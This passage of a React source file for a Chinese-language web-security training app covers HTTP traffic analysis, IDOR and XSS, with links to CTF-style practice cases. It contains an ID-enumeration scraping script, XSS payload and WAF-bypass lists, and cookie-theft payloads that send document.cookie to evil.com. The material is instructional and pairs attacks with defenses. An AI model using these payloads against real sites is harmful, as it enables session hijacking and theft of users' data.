                   <li>✅ <strong>保存成功案例</strong> - Reqable 支持保存请求模板，方便后续复用</li>
                   <li>✅ <strong>注意合法性</strong> - 只在授权的测试环境或 CTF 挑战中使用</li>
                 </ul>
               </div>

               <div className="bg-[#1e1e1e] border border-yellow-900/30 p-6 rounded-lg mt-8">
                  <h4 className="text-yellow-400 font-bold mb-2 flex items-center gap-2"><Terminal size={16}/> 实战演练</h4>
                  <p className="text-sm text-gray-400 mb-4">
                     在 <strong>Case 02</strong> 中，你需要用 1 元钱买下昂贵的笔记本电脑。这在浏览器界面上是不可能的，但使用 Composer 修改请求体就能轻松实现。这是学习「载荷伪造」技巧的最佳案例！
                  </p>
                  <button onClick={() => onNavigateToLevel('case_02')} className="bg-yellow-600 hover:bg-yellow-500 text-black font-bold px-4 py-2 rounded flex items-center gap-2 text-sm transition-colors">
                     启动关卡 02：价格篡改
                  </button>
               </div>
            </div>
          );

      case 'breakpoints':
         return (
            <div key="breakpoints" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
               <h1 className="text-3xl font-bold text-white flex items-center gap-3">
                  <Shield className="text-red-400"/> 断点与拦截 (Breakpoints)
               </h1>
               <p className="text-gray-300">
                  断点功能允许你拥有 <strong>暂停时间</strong> 的能力。你可以在请求离开你的电脑之前拦截它，修改它，然后再放行。
               </p>
               
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
                  <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                      <h3 className="text-lg font-bold text-white mb-2">请求断点 (Request)</h3>
                      <p className="text-sm text-gray-400">在发送给服务器之前暂停。用于绕过前端验证、修改上传文件内容等。</p>
                  </div>
                  <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                      <h3 className="text-lg font-bold text-white mb-2">响应断点 (Response)</h3>
                      <p className="text-sm text-gray-400">在浏览器收到数据之前暂停。用于伪造服务器响应、测试前端对错误代码的处理。</p>
                  </div>
               </div>

               <div className="bg-red-900/20 border border-red-500/30 p-4 rounded mt-6">
                  <p className="text-red-200 text-sm font-mono">
                     <strong>任务目标:</strong> 在 Case 07 中，前端锁死了折扣比例。使用断点拦截请求，将 "10%" 改为 "100%"。
                  </p>
                  <button onClick={() => onNavigateToLevel('case_07')} className="mt-3 text-red-400 hover:text-red-300 text-sm font-bold flex items-center gap-1 transition-colors">
                     前往练习断点操作 <ChevronRight size={14}/>
                  </button>
               </div>
            </div>
          );
      
      case 'traffic-analysis':
         return (
            <div key="traffic-analysis" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
               <h1 className="text-3xl font-bold text-white flex items-center gap-3">
                  <Layers className="text-blue-400"/> 流量分析基础
               </h1>
               <p className="text-gray-300">
                  学会"阅读"HTTP 流量是第一步。在 Reqable 的列表中，每一行都代表一次完整的请求与响应交互。
               </p>

               <h2 className="text-2xl font-bold text-white mt-6 border-b border-gray-700 pb-2">HTTP 请求结构详解</h2>

               <div className="bg-[#1e1e1e] p-4 rounded border border-gray-700 mt-4">
                 <h4 className="text-white font-bold mb-3">完整的 HTTP 请求示例</h4>
                 <pre className="text-sm text-green-400 font-mono overflow-x-auto">
{`POST /api/orders HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X)
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Length: 87

{
  "productId": 12345,
  "quantity": 2,
  "couponCode": "SAVE20"
}`}
                 </pre>
               </div>

               <h3 className="text-xl font-bold text-blue-400 mt-6">请求组成部分分解</h3>
               <ul className="space-y-4 mt-4 text-gray-300">
                   <li className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                       <div className="font-bold text-white mb-2 flex items-center gap-2">
                         <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs">1</span>
                         Method (请求方法)
                       </div>
                       <div className="space-y-2 text-sm">
                         <div><code className="text-green-400">GET</code> - 获取资源 (无 Body)</div>
                         <div><code className="text-blue-400">POST</code> - 创建资源 (有 Body)</div>
                         <div><code className="text-yellow-400">PUT</code> - 完整更新资源</div>
                         <div><code className="text-purple-400">PATCH</code> - 部分更新资源</div>
                         <div><code className="text-red-400">DELETE</code> - 删除资源</div>
                       </div>
                       <div className="mt-3 text-gray-400 text-sm">
                         💡 <strong>安全性提示</strong>：有些后端没有严格检查 Method，攻击者可能将 GET 改为 DELETE 尝试删除数据。
                       </div>
                   </li>

                   <li className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                       <div className="font-bold text-white mb-2 flex items-center gap-2">
                         <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs">2</span>
                         Path & Query (路径与查询参数)
                       </div>
                       <div className="text-sm space-y-2">
                         <div>
                           <code className="text-green-400">/api/products?category=laptop&sort=price</code>
                         </div>
                         <ul className="list-disc pl-5 text-gray-400 space-y-1">
                           <li><strong>路径 (Path):</strong> <code>/api/products</code> - 资源位置</li>
                           <li><strong>查询参数 (Query):</strong> <code>category=laptop&sort=price</code> - 过滤条件</li>
                         </ul>
                       </div>
                       <div className="mt-3 text-gray-400 text-sm">
                         ⚠️ <strong>常见漏洞</strong>：Query 参数可能包含敏感信息（如 <code>?userId=123</code>），修改它可能导致越权访问。
                       </div>
                   </li>

                   <li className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                       <div className="font-bold text-white mb-2 flex items-center gap-2">
                         <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs">3</span>
                         Headers (请求头)
                       </div>
                       <div className="text-sm space-y-2">
                         <div className="bg-[#0d1117] p-2 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`Host: api.example.com
Content-Type: application/json
Authorization: Bearer <token>
Cookie: sessionId=abc123
User-Agent: Chrome/120.0
Referer: https://example.com/cart`}
                         </div>
                         <div className="text-gray-400 mt-2">
                           <strong>关键 Headers 说明：</strong>
                           <ul className="list-disc pl-5 mt-1 space-y-1">
                             <li><code>Authorization</code> - 认证令牌（JWT、API Key）</li>
                             <li><code>Cookie</code> - 会话标识（Session ID）</li>
                             <li><code>Content-Type</code> - 数据格式（JSON、XML、Form）</li>
                             <li><code>User-Agent</code> - 客户端信息（浏览器、版本）</li>
                             <li><code>Referer</code> - 请求来源页面</li>
                           </ul>
                         </div>
                       </div>
                   </li>

                   <li className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                       <div className="font-bold text-white mb-2 flex items-center gap-2">
                         <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs">4</span>
                         Body (请求体)
                       </div>
                       <div className="text-sm space-y-2">
                         <div className="bg-[#0d1117] p-2 rounded font-mono text-xs text-green-400">
{`{
  "username": "alice",
  "password": "SuperSecret123!",
  "remember": true
}`}
                         </div>
                         <div className="text-gray-400 mt-2">
                           常见格式：
                           <ul className="list-disc pl-5 mt-1 space-y-1">
                             <li><code>application/json</code> - JSON 对象</li>
                             <li><code>application/x-www-form-urlencoded</code> - 表单数据</li>
                             <li><code>multipart/form-data</code> - 文件上传</li>
                           </ul>
                         </div>
                       </div>
                   </li>
               </ul>

               <h2 className="text-2xl font-bold text-white mt-8 border-b border-gray-700 pb-2">HTTP 响应结构详解</h2>

               <div className="bg-[#1e1e1e] p-4 rounded border border-gray-700 mt-4">
                 <h4 className="text-white font-bold mb-3">完整的 HTTP 响应示例</h4>
                 <pre className="text-sm text-yellow-400 font-mono overflow-x-auto">
{`HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=xyz789; HttpOnly; Secure
Cache-Control: no-cache
Content-Length: 145

{
  "success": true,
  "orderId": "ORD-2024-001",
  "totalPrice": 2499.00,
  "estimatedDelivery": "2024-12-25"
}`}
                 </pre>
               </div>

               <h3 className="text-xl font-bold text-blue-400 mt-6">响应组成部分分解</h3>
               <ul className="space-y-4 mt-4 text-gray-300">
                   <li className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                       <div className="font-bold text-white mb-2">Status Code (状态码)</div>
                       <div className="space-y-2 text-sm">
                           <div><span className="text-green-400 font-mono font-bold">2xx 成功</span></div>
                           <ul className="list-disc pl-5 text-gray-400 space-y-1">
                             <li><code>200 OK</code> - 请求成功</li>
                             <li><code>201 Created</code> - 资源已创建</li>
                             <li><code>204 No Content</code> - 成功但无返回内容</li>
                           </ul>

                           <div className="mt-3"><span className="text-yellow-400 font-mono font-bold">3xx 重定向</span></div>
                           <ul className="list-disc pl-5 text-gray-400 space-y-1">
                             <li><code>301 Moved Permanently</code> - 永久重定向</li>
                             <li><code>302 Found</code> - 临时重定向</li>
                             <li><code>304 Not Modified</code> - 资源未修改（使用缓存）</li>
                           </ul>

                           <div className="mt-3"><span className="text-red-400 font-mono font-bold">4xx 客户端错误</span></div>
                           <ul className="list-disc pl-5 text-gray-400 space-y-1">
                             <li><code>400 Bad Request</code> - 请求格式错误</li>
                             <li><code>401 Unauthorized</code> - 未认证</li>
                             <li><code>403 Forbidden</code> - 无权限</li>
                             <li><code>404 Not Found</code> - 资源不存在</li>
                           </ul>

                           <div className="mt-3"><span className="text-red-500 font-mono font-bold">5xx 服务器错误</span></div>
                           <ul className="list-disc pl-5 text-gray-400 space-y-1">
                             <li><code>500 Internal Server Error</code> - 服务器内部错误</li>
                             <li><code>502 Bad Gateway</code> - 网关错误</li>
                             <li><code>503 Service Unavailable</code> - 服务不可用</li>
                           </ul>
                       </div>
                   </li>

                   <li className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                       <div className="font-bold text-white mb-2">Response Headers (响应头)</div>
                       <div className="text-sm">
                         <div className="bg-[#0d1117] p-2 rounded font-mono text-xs text-yellow-400 overflow-x-auto">
{`Content-Type: application/json
Set-Cookie: session=abc; HttpOnly; Secure
Cache-Control: max-age=3600
Access-Control-Allow-Origin: *`}
                         </div>
                         <div className="text-gray-400 mt-2">
                           <strong>重要 Headers：</strong>
                           <ul className="list-disc pl-5 mt-1 space-y-1">
                             <li><code>Set-Cookie</code> - 设置客户端 Cookie</li>
                             <li><code>Cache-Control</code> - 缓存策略</li>
                             <li><code>Access-Control-*</code> - CORS 跨域配置</li>
                           </ul>
                         </div>
                       </div>
                   </li>

                   <li className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                       <div className="font-bold text-white mb-2">Response Body (响应体)</div>
                       <div className="text-sm">
                         <div className="bg-[#0d1117] p-2 rounded font-mono text-xs text-yellow-400">
{`{
  "success": true,
  "data": { "userId": 42, "role": "admin" },
  "message": "Login successful"
}`}
                         </div>
                         <div className="text-gray-400 mt-2">
                           通常包含：
                           <ul className="list-disc pl-5 mt-1 space-y-1">
                             <li>业务数据 (<code>data</code>)</li>
                             <li>状态标识 (<code>success</code>, <code>error</code>)</li>
                             <li>提示信息 (<code>message</code>)</li>
                             <li>错误详情 (<code>errors</code>)</li>
                           </ul>
                         </div>
                       </div>
                   </li>
               </ul>

               <div className="bg-blue-900/20 border-l-4 border-blue-500 p-4 rounded-r mt-6">
                 <h4 className="text-blue-400 font-bold mb-2">💡 实战技巧：快速定位问题</h4>
                 <ul className="text-sm text-gray-300 space-y-2">
                   <li>✅ <strong>看状态码</strong> - 4xx 检查请求参数，5xx 联系后端</li>
                   <li>✅ <strong>看 Response Body</strong> - 通常包含详细错误信息</li>
                   <li>✅ <strong>比对请求头</strong> - 检查 Authorization、Cookie 是否正确</li>
                   <li>✅ <strong>检查 Content-Type</strong> - 确保前后端格式一致</li>
                 </ul>
               </div>
            </div>
          );

      case 'idor':
         return (
            <div key="idor" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
                  <h1 className="text-4xl font-bold text-white mb-4 flex items-center gap-3">
                    <Shield className="text-red-400" size={36}/>
                    越权访问 (IDOR) 完全指南
                  </h1>

                  <div className="bg-gradient-to-r from-red-900/30 to-orange-900/30 border border-red-500/30 p-6 rounded-lg">
                    <p className="text-lg text-gray-200 leading-relaxed">
                      <strong className="text-red-400">Insecure Direct Object References (IDOR)</strong> 是 OWASP Top 10 中"失效的访问控制"类别下的最常见漏洞。它发生在应用程序直接暴露对象的内部引用（如数据库ID、文件名），且后端未验证当前用户是否有权访问该对象。
                    </p>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-red-500 pb-3">🎯 漏洞原理详解</h2>

                  <div className="bg-[#0d1117] p-6 rounded-lg border border-gray-700">
                    <h3 className="text-xl font-bold text-white mb-4">为什么会产生 IDOR？</h3>
                    <div className="space-y-4 text-gray-300">
                      <div className="flex items-start gap-3">
                        <span className="text-red-400 text-2xl">1.</span>
                        <div>
                          <strong className="text-white">后端依赖前端限制</strong>
                          <p className="text-sm text-gray-400 mt-1">开发者认为"用户界面上看不到别人的订单,所以不会有人访问"——这是致命的假设！</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <span className="text-red-400 text-2xl">2.</span>
                        <div>
                          <strong className="text-white">缺少权限校验逻辑</strong>
                          <p className="text-sm text-gray-400 mt-1">API 直接根据 ID 从数据库取数据,未检查"当前登录用户是否拥有该对象"</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-3">
                        <span className="text-red-400 text-2xl">3.</span>
                        <div>
                          <strong className="text-white">可预测的对象引用</strong>
                          <p className="text-sm text-gray-400 mt-1">使用自增ID (1, 2, 3...) 或简单的文件名 (user_1.pdf, user_2.pdf)</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-red-500 pb-3">⚔️ 攻击步骤演示</h2>

                  <div className="space-y-6">
                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <div className="flex items-center gap-2 mb-4">
                        <div className="bg-blue-600 text-white font-bold px-3 py-1 rounded-full">步骤 1</div>
                        <h3 className="text-xl font-bold text-white">正常访问自己的资源</h3>
                      </div>
                      <p className="text-gray-300 mb-3">登录账号后,查看自己的订单详情：</p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">请求：</div>
                        <pre className="text-green-400 font-mono text-sm overflow-x-auto">
{`GET /api/orders/1001 HTTP/1.1
Host: shop.example.com
Cookie: session=abc123xyz (你的会话令牌)`}
                        </pre>
                        <div className="text-sm text-gray-400 mb-2 mt-4">响应 (200 OK)：</div>
                        <pre className="text-yellow-400 font-mono text-sm overflow-x-auto">
{`{
  "orderId": 1001,
  "userId": 42,
  "items": ["iPhone 15", "AirPods Pro"],
  "total": 9999.00,
  "address": "北京市朝阳区 xxx 号"
}`}
                        </pre>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <div className="flex items-center gap-2 mb-4">
                        <div className="bg-red-600 text-white font-bold px-3 py-1 rounded-full">步骤 2</div>
                        <h3 className="text-xl font-bold text-white">修改 ID 尝试越权</h3>
                      </div>
                      <p className="text-gray-300 mb-3">将订单号从 <code className="bg-gray-800 px-2 py-1 rounded">1001</code> 改为 <code className="bg-gray-800 px-2 py-1 rounded">1002</code>：</p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">攻击请求：</div>
                        <pre className="text-green-400 font-mono text-sm overflow-x-auto">
{`GET /api/orders/1002 HTTP/1.1   ← 只修改了这一个数字
Host: shop.example.com
Cookie: session=abc123xyz (仍然是你的 session)`}
                        </pre>
                        <div className="text-sm text-gray-400 mb-2 mt-4">漏洞响应 (200 OK - 本应返回 403!)：</div>
                        <pre className="text-yellow-400 font-mono text-sm overflow-x-auto">
{`{
  "orderId": 1002,
  "userId": 99,  ← 这是别人的订单！
  "items": ["MacBook Pro", "Magic Mouse"],
  "total": 19999.00,
  "address": "上海市浦东新区 yyy 路"  ← 泄露了他人隐私
}`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-red-900/20 border border-red-500/30 p-3 rounded">
                        <p className="text-red-300 text-sm">
                          <strong>✗ 安全漏洞</strong>：后端未检查"当前用户 (userId=42) 是否有权访问订单 1002 (属于 userId=99)"
                        </p>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <div className="flex items-center gap-2 mb-4">
                        <div className="bg-purple-600 text-white font-bold px-3 py-1 rounded-full">步骤 3</div>
                        <h3 className="text-xl font-bold text-white">批量遍历窃取数据</h3>
                      </div>
                      <p className="text-gray-300 mb-3">攻击者可以写脚本自动遍历所有 ID：</p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <pre className="text-blue-400 font-mono text-sm overflow-x-auto">
{`# Python 自动化脚本
for order_id in range(1, 10000):
    response = requests.get(
        f"https://shop.example.com/api/orders/{order_id}",
        cookies={"session": "abc123xyz"}
    )
    if response.status_code == 200:
        save_to_file(response.json())  # 保存所有用户的订单数据`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-orange-900/20 border border-orange-500/30 p-3 rounded">
                        <p className="text-orange-300 text-sm">
                          <strong>⚠️ 影响</strong>：攻击者可在几分钟内窃取平台所有用户的订单信息、收货地址、购买记录等敏感数据
                        </p>
                      </div>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-red-500 pb-3">🛡️ 正确的防御措施</h2>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        方法 1: 权限校验
                      </h3>
                      <div className="text-sm text-gray-300">
                        <p className="mb-2">后端必须验证当前用户是否拥有该对象：</p>
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// Node.js 示例
app.get('/api/orders/:id', auth, (req, res) => {
  const order = db.getOrder(req.params.id);

  // 关键检查！
  if (order.userId !== req.user.id) {
    return res.status(403).json({
      error: "Forbidden"
    });
  }

  res.json(order);
});`}
                        </pre>
                      </div>
                    </div>

                    <div className="bg-green-900/20 border border-green-500/30 p-6 rounded-lg">
                      <h3 className="text-green-400 font-bold mb-3 flex items-center gap-2">
                        <span className="text-2xl">✓</span>
                        方法 2: 不可预测 ID
                      </h3>
                      <div className="text-sm text-gray-300">
                        <p className="mb-2">使用 UUID 代替自增 ID：</p>
                        <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`// ❌ 错误：可预测
/api/orders/1
/api/orders/2
/api/orders/3

// ✅ 正确：不可预测
/api/orders/f47ac10b-58cc-4372-a567-0e02b2c3d479
/api/orders/a3c7e8d2-9f1b-4e3a-b6c4-1d5e7f8a9b0c`}
                        </pre>
                        <p className="text-gray-400 text-xs mt-2">
                          ⚠️ 注意：UUID 只能降低被猜测的概率,不能替代权限检查！
                        </p>
                      </div>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-red-500 pb-3">🌍 真实案例</h2>

                  <div className="space-y-4">
                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-xl font-bold text-red-400 mb-2">案例 1: Facebook 20 万美元漏洞赏金</h3>
                      <p className="text-gray-300 text-sm mb-3">
                        2013 年,安全研究员发现可通过修改相册 ID 访问任意用户的私密照片。Facebook 支付了 20 万美元赏金并紧急修复。
                      </p>
                      <div className="bg-[#0d1117] p-3 rounded">
                        <pre className="text-xs text-yellow-400 font-mono">
{`漏洞 URL: https://facebook.com/photo.php?fbid=12345
攻击: 修改 fbid 参数即可查看他人私密相册`}
                        </pre>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-xl font-bold text-red-400 mb-2">案例 2: Uber 司机数据泄露</h3>
                      <p className="text-gray-300 text-sm mb-3">
                        2016 年,研究员发现可通过递增 driver_id 获取所有司机的姓名、电话、车牌号、收入等敏感信息。
                      </p>
                      <div className="bg-[#0d1117] p-3 rounded">
                        <pre className="text-xs text-yellow-400 font-mono">
{`GET /api/partners/driver_id=1000
GET /api/partners/driver_id=1001
... 批量遍历获取数万司机隐私数据`}
                        </pre>
                      </div>
                    </div>
                  </div>

                  <div className="mt-12 bg-blue-900/20 border-l-4 border-blue-500 p-6 rounded-r">
                    <h3 className="text-blue-400 font-bold mb-3 flex items-center gap-2">
                      <Lightbulb size={20}/>
                      渗透测试时的注意事项
                    </h3>
                    <ul className="space-y-2 text-sm text-gray-300">
                      <li>✅ <strong>合法授权</strong>：仅在授权的测试环境或漏洞赏金计划中测试</li>
                      <li>✅ <strong>范围限制</strong>：不要大规模遍历生产数据,测试 3-5 个样本即可证明漏洞存在</li>
                      <li>✅ <strong>负责任披露</strong>：发现漏洞后立即报告给企业,不公开细节直到修复完成</li>
                      <li>❌ <strong>严禁</strong>：下载、存储、传播通过漏洞获取的真实用户数据</li>
                    </ul>
                  </div>

                  <div className="mt-8">
                    <button onClick={() => onNavigateToLevel('case_04')} className="bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-500 hover:to-orange-500 text-white px-8 py-4 rounded-lg font-bold text-lg flex items-center gap-3 transition-all transform hover:scale-105">
                      <Play size={24} />
                      开始实战：Case 04 - 订单 IDOR 漏洞利用
                      <ChevronRight size={24} />
                    </button>
                  </div>
              </div>
          );
      
      case 'xss':
         return (
            <div key="xss" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
                  <h1 className="text-4xl font-bold text-white mb-4 flex items-center gap-3">
                    <Code2 className="text-orange-400" size={36}/>
                    XSS 跨站脚本攻击完全指南
                  </h1>

                  <div className="bg-gradient-to-r from-orange-900/30 to-red-900/30 border border-orange-500/30 p-6 rounded-lg">
                    <p className="text-lg text-gray-200 leading-relaxed">
                      <strong className="text-orange-400">Cross-Site Scripting (XSS)</strong> 允许攻击者在受害者的浏览器中注入并执行恶意 JavaScript 代码。这是 OWASP Top 10 中最常见的漏洞之一,可用于窃取 Cookie、劫持会话、钓鱼攻击或传播蠕虫病毒。
                    </p>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-orange-500 pb-3">📚 XSS 三大类型</h2>

                  <div className="space-y-6">
                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-2xl font-bold text-blue-400 mb-3">1. 反射型 XSS (Reflected XSS)</h3>
                      <p className="text-gray-300 mb-4">
                        攻击代码通过 URL 参数传递,服务器将其直接反射到响应中,不存储在数据库。需要诱使受害者点击恶意链接。
                      </p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">漏洞场景 - 搜索功能：</div>
                        <pre className="text-green-400 font-mono text-sm overflow-x-auto mb-4">
{`// 用户搜索关键词
GET /search?q=iPhone HTTP/1.1

// 服务器响应 (直接插入 HTML)
<h2>搜索结果: iPhone</h2>`}
                        </pre>
                        <div className="text-sm text-gray-400 mb-2">恶意利用：</div>
                        <pre className="text-red-400 font-mono text-sm overflow-x-auto">
{`// 攻击者构造恶意 URL
https://shop.com/search?q=<script>alert(document.cookie)</script>

// 受害者点击后,浏览器执行：
<h2>搜索结果: <script>alert(document.cookie)</script></h2>
                        ↑ 弹窗显示受害者的 Cookie`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-blue-900/20 border border-blue-500/30 p-3 rounded">
                        <p className="text-blue-300 text-sm">
                          <strong>💡 特征</strong>：一次性攻击,URL 中包含恶意代码,需要社会工程学诱导点击
                        </p>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-2xl font-bold text-purple-400 mb-3">2. 存储型 XSS (Stored XSS)</h3>
                      <p className="text-gray-300 mb-4">
                        攻击代码被永久存储在服务器（数据库、文件），每次访问页面时都会执行。危害性最高！
                      </p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">漏洞场景 - 留言板功能：</div>
                        <pre className="text-green-400 font-mono text-sm overflow-x-auto mb-4">
{`// 攻击者发布留言
POST /comments HTTP/1.1
{
  "content": "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
}

// 存入数据库后,所有访问此页面的用户都会触发：
<div class="comment">
  <img src=x onerror='fetch("https://evil.com?cookie="+document.cookie)'>
</div>
          ↑ 自动发送每个用户的 Cookie 到攻击者服务器`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-purple-900/20 border border-purple-500/30 p-3 rounded">
                        <p className="text-purple-300 text-sm">
                          <strong>⚠️ 危害</strong>：持久化攻击,无需用户交互,可传播蠕虫病毒（如 2005 年 MySpace Samy 蠕虫）
                        </p>
                      </div>
                    </div>

                    <div className="bg-[#161b22] p-6 rounded-lg border border-gray-700">
                      <h3 className="text-2xl font-bold text-yellow-400 mb-3">3. DOM 型 XSS (DOM-based XSS)</h3>
                      <p className="text-gray-300 mb-4">
                        攻击发生在客户端,通过修改 DOM 环境执行恶意代码。服务器端无法检测,因为不经过后端处理。
                      </p>
                      <div className="bg-[#0d1117] p-4 rounded border border-gray-800">
                        <div className="text-sm text-gray-400 mb-2">漏洞代码 - 前端直接操作 URL 参数：</div>
                        <pre className="text-yellow-400 font-mono text-sm overflow-x-auto mb-4">
{`// 前端 JavaScript 代码
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.getElementById('greeting').innerHTML = "Hello, " + name;
                                                             ↑ 危险！直接插入 HTML

// 攻击者构造 URL
https://app.com/?name=<img src=x onerror=alert(1)>

// 浏览器执行 (服务器无法察觉)
<div id="greeting">Hello, <img src=x onerror=alert(1)></div>`}
                        </pre>
                      </div>
                      <div className="mt-4 bg-yellow-900/20 border border-yellow-500/30 p-3 rounded">
                        <p className="text-yellow-300 text-sm">
                          <strong>🔍 特点</strong>：绕过服务器端 WAF,仅前端代码审计能发现
                        </p>
                      </div>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-orange-500 pb-3">🎭 常见 XSS Payload 技巧</h2>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                      <h4 className="text-white font-bold mb-2">基础 Payload</h4>
                      <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-green-400 overflow-x-auto">
{`<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">`}
                      </pre>
                    </div>

                    <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                      <h4 className="text-white font-bold mb-2">绕过过滤 (大小写/编码)</h4>
                      <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-yellow-400 overflow-x-auto">
{`<ScRiPt>alert(1)</sCrIpT>
<img src=x oNeRrOr=alert(1)>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>`}
                      </pre>
                    </div>

                    <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                      <h4 className="text-white font-bold mb-2">绕过标签过滤</h4>
                      <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-blue-400 overflow-x-auto">
{`// <script> 被过滤时
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>`}
                      </pre>
                    </div>

                    <div className="bg-[#161b22] p-4 rounded border border-gray-700">
                      <h4 className="text-white font-bold mb-2">Cookie 窃取</h4>
                      <pre className="bg-[#0d1117] p-3 rounded font-mono text-xs text-red-400 overflow-x-auto">
{`<script>
fetch('https://evil.com?c='+document.cookie)
</script>

<img src=x onerror="
  new Image().src='https://evil.com?c='+document.cookie
">`}
                      </pre>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-orange-500 pb-3">🛡️ WAF 绕过技巧</h2>

                  <div className="bg-[#0d1117] p-6 rounded-lg border border-gray-700">
                    <h3 className="text-xl font-bold text-white mb-4">黑名单防御的局限性</h3>
                    <p className="text-gray-300 mb-4">
                      WAF (Web Application Firewall) 通常使用黑名单拦截恶意关键词,但攻击者有无数种方法绕过：
                    </p>
                    <div className="space-y-4">
                      <div>
                        <div className="text-blue-400 font-bold mb-2">技巧 1: 使用 HTML 实体编码</div>
                        <pre className="bg-[#161b22] p-3 rounded font-mono text-xs text-green-400">
{`// 原始 Payload
<img src=x onerror=alert(1)>

// 编码绕过
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
                    ↑ alert 的 HTML 实体编码`}
                        </pre>
                      </div>

                      <div>
                        <div className="text-purple-400 font-bold mb-2">技巧 2: 注释符分割</div>
                        <pre className="bg-[#161b22] p-3 rounded font-mono text-xs text-green-400">
{`<scr<!--bypass-->ipt>alert(1)</scr<!--bypass-->ipt>
<img src=x one/**/rror=alert(1)>`}
                        </pre>
                      </div>

                      <div>
                        <div className="text-yellow-400 font-bold mb-2">技巧 3: 换行符/Tab 分割</div>
                        <pre className="bg-[#161b22] p-3 rounded font-mono text-xs text-green-400">
{`<img
src=x
onerror=
alert(1)>`}
                        </pre>
                      </div>

                      <div>
                        <div className="text-red-400 font-bold mb-2">技巧 4: 使用罕见事件处理器</div>
                        <pre className="bg-[#161b22] p-3 rounded font-mono text-xs text-green-400">
{`// 常见事件可能被过滤: onerror, onload, onclick
// 使用罕见事件：
<body onhashchange=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video onloadstart=alert(1)>`}
                        </pre>
                      </div>
                    </div>
                  </div>

                  <h2 className="text-3xl font-bold text-white mt-12 mb-6 border-b-2 border-orange-500 pb-3">🛡️ 开发者防御指南</h2>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
